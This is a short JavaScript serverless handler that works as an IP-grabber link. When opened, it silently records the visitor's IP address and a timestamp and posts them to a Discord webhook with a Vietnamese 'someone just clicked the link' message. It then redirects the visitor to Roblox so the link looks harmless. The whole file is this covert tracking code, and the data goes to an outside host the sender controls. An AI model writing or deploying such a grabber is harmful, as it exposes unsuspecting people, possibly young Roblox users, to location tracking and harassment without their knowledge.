export default async function handler(req, res) {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const date = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

    const webhook = process.env.DISCORD_WEBHOOK;
    const payload = {
        content: `🖱️ Có người vừa click link!\n✅ IP: \`${ip}\`\n🕒 Thời gian: ${date}`
    };

    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    res.writeHead(302, { Location: 'https://www.roblox.com/' });
    res.end();
}
